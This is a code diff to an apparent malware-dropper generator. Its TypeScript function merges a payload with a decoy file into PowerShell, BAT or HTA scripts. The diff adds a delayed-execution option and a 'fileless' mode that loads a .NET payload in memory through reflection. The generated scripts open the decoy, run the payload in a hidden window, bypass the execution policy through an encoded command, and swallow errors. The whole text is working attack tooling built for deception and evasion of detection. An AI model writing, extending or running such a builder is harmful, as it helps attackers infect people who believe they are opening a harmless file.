@@ -15,6 +15,8 @@ const MergePayloadsInputSchema = z.object({
   obfuscationType: z.enum(['none', 'xor', 'hex']).default('none'),
   encryptionKey: z.string().optional(),
   useFragmentation: z.boolean().optional(),
+  executionDelay: z.string().optional(),
+  fileless: z.boolean().optional(),
 });
 
 type MergePayloadsInput = z.infer<typeof MergePayloadsInputSchema>;
@@ -43,10 +45,25 @@ function xorEncrypt(data: string, key: string): string {
     return result;
 }
 
-const generatePowershellDropper = (payloadName: string, payloadString: string, benignName: string, benignBase64: string, obfuscationType: MergePayloadsInput['obfuscationType'], encryptionKey?: string, useFragmentation?: boolean): string => {
+const generatePowershellDropper = (
+    payloadName: string, 
+    payloadString: string, 
+    benignName: string, 
+    benignBase64: string, 
+    obfuscationType: MergePayloadsInput['obfuscationType'], 
+    encryptionKey?: string, 
+    useFragmentation?: boolean,
+    executionDelay?: string,
+    fileless?: boolean
+): string => {
     
     let payloadSection: string;
     let payloadDecoding: string;
+    let delaySection = '';
+    
+    if (executionDelay && !isNaN(parseInt(executionDelay, 10))) {
+        delaySection = `Start-Sleep -Seconds ${parseInt(executionDelay, 10)}`;
+    }
 
     if (useFragmentation) {
         const chunkSize = 1000;
@@ -71,7 +88,7 @@ for ($i = 0; $i -lt $encryptedBytes.Length; $i++) {
 }`;
     } else if (obfuscationType === 'hex') {
         payloadDecoding = `
-$hexString = $payloadData -replace ' '
+$hexString = $payloadData -replace '[\\s\\r\\n]'
 $payloadFileBytes = New-Object byte[] ($hexString.Length / 2)
 for ($i = 0; $i -lt $hexString.Length; $i += 2) {
     $payloadFileBytes[$i/2] = [System.Convert]::ToByte($hexString.Substring($i, 2), 16)
@@ -81,10 +98,39 @@ for ($i = 0; $i -lt $hexString.Length; $i += 2) {
         payloadDecoding = `\n$payloadFileBytes = [System.Convert]::FromBase64String($payloadData)`;
     }
     
+    let executionSection: string;
+
+    if (fileless) {
+        // Attempt to load and execute the assembly from memory.
+        // This assumes the payload is a .NET executable.
+        executionSection = `
+try {
+    $assembly = [System.Reflection.Assembly]::Load($payloadFileBytes)
+    $entryPoint = $assembly.EntryPoint
+    if ($entryPoint) {
+        $entryPoint.Invoke($null, $null)
+    } else {
+        # Fallback for non-exe payloads or different structures.
+        $payloadFilePath = Join-Path $tempPath "${payloadName}"
+        [IO.File]::WriteAllBytes($payloadFilePath, $payloadFileBytes)
+        Start-Process -FilePath $payloadFilePath -WindowStyle Hidden
+    }
+} catch {
+    # If in-memory fails, fall back to disk.
+    $payloadFilePath = Join-Path $tempPath "${payloadName}"
+    [IO.File]::WriteAllBytes($payloadFilePath, $payloadFileBytes)
+    Start-Process -FilePath $payloadFilePath -WindowStyle Hidden
+}`;
+    } else {
+        executionSection = `
+$payloadFilePath = Join-Path $tempPath "${payloadName}"
+[IO.File]::WriteAllBytes($payloadFilePath, $payloadFileBytes)
+Start-Process -FilePath $payloadFilePath -WindowStyle Hidden`;
+    }
+
     return `
 $tempPath = $env:TEMP
 $benignFilePath = Join-Path $tempPath "${benignName}"
-$payloadFilePath = Join-Path $tempPath "${payloadName}"
 
 try {
     $benignFileBase64 = @"
@@ -95,10 +141,10 @@ ${benignBase64}
     ${payloadDecoding}
     
     [IO.File]::WriteAllBytes($benignFilePath, [System.Convert]::FromBase64String($benignFileBase64))
-    [IO.File]::WriteAllBytes($payloadFilePath, $payloadFileBytes)
-
     Start-Process $benignFilePath
-    Start-Process -FilePath $payloadFilePath -WindowStyle Hidden
+
+    ${delaySection}
+    ${executionSection}
 } catch {
     # Fail silently
 }
@@ -113,7 +159,7 @@ ${benignBase64}
 export async function mergePayloads(input: MergePayloadsInput): Promise<MergePayloadsOutput> {
   try {
     const validatedInput = MergePayloadsInputSchema.parse(input);
-    const { payload, benign, outputFormat, obfuscationType, encryptionKey, useFragmentation } = validatedInput;
+    const { payload, benign, outputFormat, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless } = validatedInput;
 
     let payloadBase64 = decodeDataUri(payload.content);
     const benignBase64 = decodeDataUri(benign.content);
@@ -133,11 +179,11 @@ export async function mergePayloads(input: MergePayloadsInput): Promise<MergePay
 
     switch (outputFormat) {
         case 'ps1':
-            scriptContent = generatePowershellDropper(payload.name, payloadString, benign.name, benignBase64, obfuscationType, encryptionKey, useFragmentation);
+            scriptContent = generatePowershellDropper(payload.name, payloadString, benign.name, benignBase64, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless);
             break;
         
         case 'bat':
-            const psScript = generatePowershellDropper(payload.name, payloadString, benign.name, benignBase64, obfuscationType, encryptionKey, useFragmentation);
+            const psScript = generatePowershellDropper(payload.name, payloadString, benign.name, benignBase64, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless);
             const encodedPsScript = Buffer.from(psScript, 'utf16le').toString('base64');
             scriptContent = `@echo off\npowershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${encodedPsScript}`;
             break;
@@ -206,6 +252,7 @@ export async function mergePayloads(input: MergePayloadsInput): Promise<MergePay
                 ${payloadProcessingSection}
                 
                 objShell.Run "cmd /c """ & benignFilePath & """", 0, True
+                ${executionDelay ? `WScript.Sleep ${parseInt(executionDelay, 10) * 1000}` : ''}
                 objShell.Run "cmd /c """ & payloadFilePath & """", 0, False ' Run payload hidden
 
                 ' Close the HTA window
